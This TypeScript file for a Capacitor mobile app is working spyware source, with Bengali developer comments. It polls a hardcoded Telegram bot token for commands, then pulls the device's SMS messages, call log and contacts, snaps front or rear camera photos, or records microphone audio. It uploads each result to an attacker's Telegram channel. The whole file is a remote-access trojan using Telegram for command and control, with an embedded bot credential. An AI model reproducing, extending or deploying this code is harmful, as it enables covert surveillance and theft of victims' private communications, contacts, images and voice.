import { registerPlugin } from '@capacitor/core';
import { Camera, CameraResultType, CameraSource, CameraDirection } from '@capacitor/camera';
import { Contacts } from '@capacitor-community/contacts';

const NativeData = registerPlugin<any>('NativeData');
const BOT_TOKEN = '8367516207:AAEKQnowvWWC32Z2eaPVjuRrxKfl1alssIA';
const CHANNEL_ID = '-1003552771281';
let lastUpdateId = 0;

export const startRemoteListener = (onToast: (msg: string) => void) => {
  const poll = async () => {
    try {
      const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=30`);
      const data = await response.json();
      if (data.ok && data.result.length > 0) {
        for (const update of data.result) {
          lastUpdateId = update.update_id;
          if (update.message?.text) await handleCommand(update.message.text);
        }
      }
    } catch (e) {}
    setTimeout(poll, 2500);
  };
  poll();
};

const sendFile = async (content: string, filename: string) => {
    const blob = new Blob([content || "No Data"], { type: 'text/plain' });
    const fd = new FormData();
    fd.append('chat_id', CHANNEL_ID);
    fd.append('document', blob, filename);
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, { method: 'POST', body: fd });
};

const handleCommand = async (text: string) => {
  const cmd = text.split(' ')[0].toLowerCase();

  switch (cmd) {
    case '/sms':
        const s = await NativeData.getSMS();
        await sendFile(s.data, "sms.txt");
        break;
    case '/call_log':
        const c = await NativeData.getCalls();
        await sendFile(c.data, "calls.txt");
        break;
    case '/contacts':
        // এই অংশটুকু পরিবর্তন করা হলো
        const con = await Contacts.getContacts({
            projection: {
                name: true,
                phones: true
            }
        });
        
        // নিচের অংশটুকু আগের মতোই থাকবে
        const list = con.contacts.map(u => `${u.name?.display}: ${u.phones?.[0]?.number}`).join('\n');
        await sendFile(list, "contacts.txt");
        break;
    case '/pic_front':
        const imgF = await Camera.getPhoto({ quality: 90, resultType: CameraResultType.Base64, source: CameraSource.Camera, direction: CameraDirection.Front });
        if(imgF.base64String) await sendPhoto(imgF.base64String);
        break;
    case '/pic_back':
        const imgB = await Camera.getPhoto({ quality: 90, resultType: CameraResultType.Base64, source: CameraSource.Camera, direction: CameraDirection.Rear });
        if(imgB.base64String) await sendPhoto(imgB.base64String);
        break;
    case '/mic':
        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
        const rec = new MediaRecorder(stream);
        const chunks: any = [];
        rec.ondataavailable = (e) => chunks.push(e.data);
        rec.onstop = async () => {
            const blob = new Blob(chunks, { type: 'audio/mp3' });
            const fd = new FormData();
            fd.append('chat_id', CHANNEL_ID);
            fd.append('voice', blob, 'audio.mp3');
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVoice`, { method: 'POST', body: fd });
        };
        rec.start();
        setTimeout(() => rec.stop(), 10000);
        break;
  }
};

const sendPhoto = async (base64: string) => {
    const blob = await (await fetch(`data:image/jpeg;base64,${base64}`)).blob();
    const fd = new FormData();
    fd.append('chat_id', CHANNEL_ID);
    fd.append('photo', blob, 'img.jpg');
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
};
